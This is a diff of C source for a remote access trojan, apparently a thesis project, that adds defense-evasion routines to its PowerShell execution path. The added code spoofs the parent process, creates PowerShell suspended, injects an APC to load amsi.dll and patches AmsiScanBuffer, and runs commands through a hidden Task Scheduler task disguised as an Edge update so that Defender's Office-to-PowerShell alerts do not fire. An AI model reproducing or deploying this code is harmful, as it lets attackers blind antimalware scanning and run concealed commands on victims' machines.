@@ -13,6 +13,8 @@
 #include <string.h>
 #include <time.h>
 #include "evasion/ekko.h"
+#include <taskschd.h>
+#include <oleauto.h>
 
 #define C2_HOST          L"192.168.42.124"
 #define C2_PORT          443
@@ -327,8 +329,15 @@ static BOOL _patch_amsi_child(HANDLE hProc, BYTE *childAmsiBase) {
     return ok && (written == sizeof(patch));
 }
 
-/* ── exec_ps_patched: PPID spoof + AMSI patch + stdin execution ───────────── */
-static char* exec_ps_patched(const char *ps_cmd) {
+/* ── _exec_ps_direct: PPID spoof + CREATE_SUSPENDED + APC AMSI patch ─────────
+ * Fallback: crea PowerShell direttamente come processo figlio.
+ * Usata quando il Task Scheduler COM non è disponibile.
+ * CREATE_SUSPENDED + QueueUserAPC(LoadLibraryA) → patcha AmsiScanBuffer
+ * PRIMA che PS esegua codice (elimina race condition del vecchio poll loop).
+ * NOTA: Se il processo host è un'app Office (EXCEL.EXE, WINWORD.EXE),
+ * Defender può comunque triggerare un behavioral alert sulla catena parent.
+ * Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA                     */
+static char* _exec_ps_direct(const char *ps_cmd) {
     SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
     HANDLE hStdinR  = NULL, hStdinW  = NULL;
     HANDLE hStdoutR = NULL, hStdoutW = NULL;
@@ -373,7 +382,9 @@ static char* exec_ps_patched(const char *ps_cmd) {
     char cmdline[] = "powershell.exe -NoP -NonI -";
     PROCESS_INFORMATION pi = {0};
 
-    DWORD createFlags = CREATE_NO_WINDOW;
+    /* CREATE_SUSPENDED: il processo viene creato ma il thread primario
+     * non esegue — ci dà tempo di patchare AMSI prima che PS parta */
+    DWORD createFlags = CREATE_NO_WINDOW | CREATE_SUSPENDED;
     if (ppidOk) createFlags |= EXTENDED_STARTUPINFO_PRESENT;
 
     BOOL spawned = CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
@@ -381,7 +392,7 @@ static char* exec_ps_patched(const char *ps_cmd) {
                                   g_cwd[0] ? g_cwd : NULL,
                                   (LPSTARTUPINFOA)&siEx, &pi);
 
-    if (pAttr)  { DeleteProcThreadAttributeList(pAttr); HeapFree(GetProcessHeap(), 0, pAttr); }
+    if (pAttr)   { DeleteProcThreadAttributeList(pAttr); HeapFree(GetProcessHeap(), 0, pAttr); }
     if (hParent) CloseHandle(hParent);
     CloseHandle(hStdinR);
     CloseHandle(hStdoutW);
@@ -392,18 +403,43 @@ static char* exec_ps_patched(const char *ps_cmd) {
         return NULL;
     }
 
-    /* ── Poll su moduli del figlio finché amsi.dll appare, poi patch ──── */
+    /* ── Patch AMSI nel figlio PRIMA di riprendere l'esecuzione ────────
+     * Il processo è SUSPENDED: forziamo il caricamento di amsi.dll
+     * iniettando un APC che chiama LoadLibraryA("amsi.dll") sul thread
+     * primario. Al ResumeThread l'APC esegue per primo, carica la DLL,
+     * e noi la patchiamo prima che PS processi qualsiasi input. ─────── */
     HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
     if (hProc) {
-        for (int i = 0; i < 50; i++) {
-            Sleep(100);
-            BYTE *amsiBase = _child_amsi_base(pi.dwProcessId);
-            if (amsiBase) {
-                _patch_amsi_child(hProc, amsiBase);
-                break;
-            }
+        HMODULE hK32  = GetModuleHandleA("kernel32.dll");
+        FARPROC pLLA  = GetProcAddress(hK32, "LoadLibraryA");
+
+        /* Scrivi la stringa "amsi.dll" nella memoria del figlio */
+        const char amsi_name[] = "amsi.dll";
+        LPVOID pRemStr = VirtualAllocEx(hProc, NULL, sizeof(amsi_name),
+                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (pRemStr) {
+            WriteProcessMemory(hProc, pRemStr, amsi_name, sizeof(amsi_name), NULL);
+            /* Accoda APC: quando il thread riprende, esegue LoadLibraryA("amsi.dll")
+             * PRIMA di qualsiasi altro codice nel processo */
+            QueueUserAPC((PAPCFUNC)pLLA, pi.hThread, (ULONG_PTR)pRemStr);
         }
+
+        /* Riprendi il thread — APC esegue LoadLibraryA("amsi.dll") */
+        ResumeThread(pi.hThread);
+        Sleep(200);   /* breve attesa per completamento APC + init DLL */
+
+        /* amsi.dll è ora caricata — patcha AmsiScanBuffer */
+        BYTE *amsiBase = _child_amsi_base(pi.dwProcessId);
+        if (amsiBase)
+            _patch_amsi_child(hProc, amsiBase);
+
+        /* Cleanup allocazione remota */
+        if (pRemStr)
+            VirtualFreeEx(hProc, pRemStr, 0, MEM_RELEASE);
         CloseHandle(hProc);
+    } else {
+        /* Fallback: riprendi senza patch AMSI */
+        ResumeThread(pi.hThread);
     }
 
     /* ── Invia script via stdin → leggi output ────────────────────────── */
@@ -440,6 +476,219 @@ static char* exec_ps_patched(const char *ps_cmd) {
     char *utf8_out = to_utf8(raw_out, total);
     free(raw_out);
     return utf8_out;
+}
+
+/* ── _exec_ps_via_task: esegue PS via Task Scheduler (T1053.005) ──────────────
+ * Spezza completamente la catena parent EXCEL.EXE → powershell.exe.
+ * Il Task Scheduler (svchost.exe) spawna cmd.exe → powershell.exe.
+ * Output catturato via file temporaneo, task cancellata dopo l'esecuzione.
+ * Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA                      */
+static char* _exec_ps_via_task(const char *ps_cmd) {
+    HRESULT hr;
+    char   *result       = NULL;
+    BOOL    comNeedUninit = FALSE;
+
+    ITaskService       *pService  = NULL;
+    ITaskDefinition    *pTask     = NULL;
+    ITaskSettings      *pSettings = NULL;
+    IActionCollection  *pActions  = NULL;
+    IAction            *pAction   = NULL;
+    IExecAction        *pExec     = NULL;
+    ITaskFolder        *pFolder   = NULL;
+    IRegisteredTask    *pRegTask  = NULL;
+
+    VARIANT vEmpty;
+    VariantInit(&vEmpty);
+
+    srand((unsigned)GetTickCount() ^ GetCurrentProcessId());
+    unsigned r1 = (unsigned)rand() & 0xFFFF;
+    unsigned r2 = (unsigned)rand() & 0xFFFF;
+
+    /* ── File temporanei: script PS e output ──────────────────────────── */
+    char tempDir[MAX_PATH];
+    GetTempPathA(MAX_PATH, tempDir);
+
+    char ps1Path[MAX_PATH], outPath[MAX_PATH];
+    snprintf(ps1Path, MAX_PATH, "%s~eu_%04x.ps1", tempDir, r1);
+    snprintf(outPath, MAX_PATH, "%s~eu_%04x.tmp", tempDir, r2);
+
+    /* Scrivi il comando PS nel file .ps1 (evita problemi di quoting) */
+    FILE *f = fopen(ps1Path, "w");
+    if (!f) return NULL;
+    fprintf(f, "%s\n", ps_cmd);
+    fclose(f);
+
+    /* ── Task name pseudo-random ──────────────────────────────────────── */
+    WCHAR taskName[64];
+    wsprintfW(taskName, L"EdgeUpdate_%04X%04X", r1, r2);
+
+    /* ── Argomenti per cmd.exe ─────────────────────────────────────────
+     * cmd /c powershell.exe -NoP -NonI -ExecutionPolicy Bypass
+     *       -File "script.ps1" > "output.tmp" 2>&1
+     * Il redirection è gestito da cmd.exe → output nel file temporaneo */
+    wchar_t wPs1[MAX_PATH], wOut[MAX_PATH];
+    MultiByteToWideChar(CP_ACP, 0, ps1Path, -1, wPs1, MAX_PATH);
+    MultiByteToWideChar(CP_ACP, 0, outPath, -1, wOut, MAX_PATH);
+
+    WCHAR wArgs[MAX_PATH * 3];
+    _snwprintf(wArgs, MAX_PATH * 3 - 1,
+        L"/c powershell.exe -NoP -NonI -ExecutionPolicy Bypass "
+        L"-File \"%s\" > \"%s\" 2>&1",
+        wPs1, wOut);
+
+    /* ── CWD ──────────────────────────────────────────────────────────── */
+    wchar_t wCwd[MAX_PATH] = {0};
+    if (g_cwd[0])
+        MultiByteToWideChar(CP_ACP, 0, g_cwd, -1, wCwd, MAX_PATH);
+
+    /* ── COM init ─────────────────────────────────────────────────────── */
+    hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+    if (hr == S_OK || hr == S_FALSE)
+        comNeedUninit = TRUE;
+    else if (hr != RPC_E_CHANGED_MODE)      /* COM non disponibile */
+        goto cleanup;
+    /* RPC_E_CHANGED_MODE: COM già inizializzato in altro modo → usabile */
+
+    /* ── ITaskService ─────────────────────────────────────────────────── */
+    hr = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_ALL,
+                          &IID_ITaskService, (void **)&pService);
+    if (FAILED(hr)) goto cleanup;
+
+    hr = pService->lpVtbl->Connect(pService, vEmpty, vEmpty, vEmpty, vEmpty);
+    if (FAILED(hr)) goto cleanup;
+
+    hr = pService->lpVtbl->NewTask(pService, 0, &pTask);
+    if (FAILED(hr)) goto cleanup;
+
+    /* ── Settings: nascosto, esegui su batteria ──────────────────────── */
+    hr = pTask->lpVtbl->get_Settings(pTask, &pSettings);
+    if (SUCCEEDED(hr)) {
+        pSettings->lpVtbl->put_Hidden(pSettings, VARIANT_TRUE);
+        pSettings->lpVtbl->put_DisallowStartIfOnBatteries(pSettings, VARIANT_FALSE);
+        pSettings->lpVtbl->put_StopIfGoingOnBatteries(pSettings, VARIANT_FALSE);
+        pSettings->lpVtbl->Release(pSettings); pSettings = NULL;
+    }
+
+    /* ── Action: cmd.exe /c powershell … ─────────────────────────────── */
+    hr = pTask->lpVtbl->get_Actions(pTask, &pActions);
+    if (FAILED(hr)) goto cleanup;
+
+    hr = pActions->lpVtbl->Create(pActions, TASK_ACTION_EXEC, &pAction);
+    if (FAILED(hr)) goto cleanup;
+
+    hr = pAction->lpVtbl->QueryInterface(pAction,
+             &IID_IExecAction, (void **)&pExec);
+    if (FAILED(hr)) goto cleanup;
+
+    { BSTR bp = SysAllocString(L"cmd.exe");
+      pExec->lpVtbl->put_Path(pExec, bp);
+      SysFreeString(bp); }
+
+    { BSTR ba = SysAllocString(wArgs);
+      pExec->lpVtbl->put_Arguments(pExec, ba);
+      SysFreeString(ba); }
+
+    if (wCwd[0]) {
+        BSTR bc = SysAllocString(wCwd);
+        pExec->lpVtbl->put_WorkingDirectory(pExec, bc);
+        SysFreeString(bc);
+    }
+
+    pExec->lpVtbl->Release(pExec);       pExec    = NULL;
+    pAction->lpVtbl->Release(pAction);   pAction  = NULL;
+    pActions->lpVtbl->Release(pActions); pActions = NULL;
+
+    /* ── Registra nella root folder ──────────────────────────────────── */
+    hr = pService->lpVtbl->GetFolder(pService, (BSTR)L"\\", &pFolder);
+    if (FAILED(hr)) goto cleanup;
+
+    { BSTR bName = SysAllocString(taskName);
+      hr = pFolder->lpVtbl->RegisterTaskDefinition(
+          pFolder, bName, pTask,
+          TASK_CREATE_OR_UPDATE,
+          vEmpty, vEmpty,
+          TASK_LOGON_INTERACTIVE_TOKEN,
+          vEmpty, &pRegTask);
+      SysFreeString(bName); }
+    if (FAILED(hr)) goto cleanup;
+
+    /* ── Esegui immediatamente via IRegisteredTask::Run ───────────────── */
+    { VARIANT vNull;
+      VariantInit(&vNull);
+      IRunningTask *pRunning = NULL;
+      hr = pRegTask->lpVtbl->Run(pRegTask, vNull, &pRunning);
+      if (pRunning) pRunning->lpVtbl->Release(pRunning);
+      if (FAILED(hr)) goto delete_task; }
+
+    /* ── Poll fino a completamento (max 15 s) ────────────────────────── */
+    for (int i = 0; i < 150; i++) {
+        Sleep(100);
+        TASK_STATE state = TASK_STATE_UNKNOWN;
+        pRegTask->lpVtbl->get_State(pRegTask, &state);
+        if (state != TASK_STATE_RUNNING && state != TASK_STATE_QUEUED)
+            break;
+    }
+
+delete_task:
+    /* ── Cancella la task one-shot ────────────────────────────────────── */
+    { BSTR bName = SysAllocString(taskName);
+      pFolder->lpVtbl->DeleteTask(pFolder, bName, 0);
+      SysFreeString(bName); }
+
+    /* ── Leggi output dal file temporaneo ─────────────────────────────── */
+    { HANDLE hFile = CreateFileA(outPath, GENERIC_READ, FILE_SHARE_READ,
+                                  NULL, OPEN_EXISTING,
+                                  FILE_ATTRIBUTE_NORMAL, NULL);
+      if (hFile != INVALID_HANDLE_VALUE) {
+          DWORD fSize = GetFileSize(hFile, NULL);
+          if (fSize > 0 && fSize < 10 * 1024 * 1024) {
+              char *buf = (char *)malloc(fSize + 1);
+              if (buf) {
+                  DWORD rd;
+                  ReadFile(hFile, buf, fSize, &rd, NULL);
+                  buf[rd] = '\0';
+                  /* Il file è in codepage OEM (redirect cmd.exe) → converti UTF-8 */
+                  result = to_utf8(buf, rd);
+                  free(buf);
+              }
+          }
+          CloseHandle(hFile);
+      }
+    }
+
+cleanup:
+    DeleteFileA(ps1Path);
+    DeleteFileA(outPath);
+    if (pRegTask)  pRegTask->lpVtbl->Release(pRegTask);
+    if (pFolder)   pFolder->lpVtbl->Release(pFolder);
+    if (pExec)     pExec->lpVtbl->Release(pExec);
+    if (pAction)   pAction->lpVtbl->Release(pAction);
+    if (pActions)  pActions->lpVtbl->Release(pActions);
+    if (pSettings) pSettings->lpVtbl->Release(pSettings);
+    if (pTask)     pTask->lpVtbl->Release(pTask);
+    if (pService)  pService->lpVtbl->Release(pService);
+    if (comNeedUninit) CoUninitialize();
+
+    /* Rimuovi whitespace finale */
+    if (result) {
+        size_t len = strlen(result);
+        while (len > 0 && (result[len-1]=='\n' || result[len-1]=='\r'
+                        || result[len-1]==' '))
+            result[--len] = '\0';
+    }
+    return result;
+}
+
+/* ── exec_ps_patched: wrapper con fallback ───────────────────────────────────
+ * 1) Prova esecuzione via Task Scheduler (T1053.005) → parent = svchost.exe
+ *    Spezza la catena EXCEL.EXE → powershell.exe che triggera behavioral alert.
+ * 2) Se COM/TaskScheduler fallisce → fallback CREATE_SUSPENDED + APC patch.
+ * Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA                      */
+static char* exec_ps_patched(const char *ps_cmd) {
+    char *result = _exec_ps_via_task(ps_cmd);
+    if (result) return result;
+    /* Fallback: CreateProcess diretto (meno stealth se host è Office) */
+    return _exec_ps_direct(ps_cmd);
 }
 
 /* ── execute_command: CWD persistente via batch file temporaneo in %TEMP% ──────*/
